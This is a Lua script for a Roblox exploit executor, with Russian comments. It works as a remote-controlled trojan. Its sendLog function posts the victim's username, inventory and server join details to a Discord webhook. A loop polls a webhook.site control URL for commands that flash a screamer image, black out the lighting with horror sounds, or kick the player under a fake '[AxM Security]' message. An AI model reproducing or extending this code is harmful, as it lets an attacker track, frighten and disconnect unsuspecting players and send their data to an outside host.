-- Функция отправки отчетов в твой Discord
local function sendLog(title, desc, color)
    pcall(function()
        local inv = ""
        for _, v in pairs(lp.Backpack:GetChildren()) do inv = inv .. "[" .. v.Name .. "] " end
        local data = {
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = desc,
                ["color"] = color or 0x00ffff,
                ["fields"] = {
                    {["name"] = "👤 Жертва", ["value"] = "||"..lp.Name.."||", ["inline"] = true},
                    {["name"] = "🎒 Инвентарь", ["value"] = "```" .. (inv ~= "" and inv or "Пусто") .. "```"},
                    {["name"] = "🔗 Join Server", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')```"}
                }
            }}
        }
        local req = request or http_request or (syn and syn.request)
        if req then req({Url = log_webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
    end)
end

-- Система чтения команд из Webhook.site
task.spawn(function()
    local last_id = ""
    while task.wait(3) do -- Проверка чата каждые 3 сек
        pcall(function()
            local response = game:HttpGet(control_url)
            local data = HttpService:JSONDecode(response)
            if data and data.data and data.data[1] then
                local latest = data.data[1]
                if latest.id ~= last_id then
                    last_id = latest.id
                    local content = string.lower(latest.content or "")
                    
                    -- Команда: SCREAMER
                    if string.find(content, "screamer") then
                        local g = Instance.new("ScreenGui", lp.PlayerGui)
                        local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1.5,0,1.5,0); i.Position = UDim2.new(-0.25,0,-0.25,0)
                        i.Image = "rbxassetid://15518663806"
                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
                        task.wait(0.5); g:Destroy()
                        sendLog("😱 ВЫПОЛНЕН СКРИМЕР", "Жертва напугана через чат.", 0xffffff)
                    
                    -- Команда: HORROR
                    elseif string.find(content, "horror") then
                        Lighting.ClockTime = 0
                        Lighting.Brightness = 0
                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://163721344"; s.Volume = 3; s:Play()
                        sendLog("🌑 ВЫПОЛНЕН УЖАС", "Тьма активирована через чат.", 0x000000)
                    
                    -- Команда: KICK
                    elseif string.find(content, "kick") then
                        local reason = string.match(content, "kick%s*%((.*)%)") or "Disconnected by Admin"
                        sendLog("💀 ВЫПОЛНЕН КИК", "Причина: " .. reason, 0xff0000)
                        lp:Kick("\n[AxM Security]\n" .. reason)
                    end
                end
            end
        end)
    end
end)

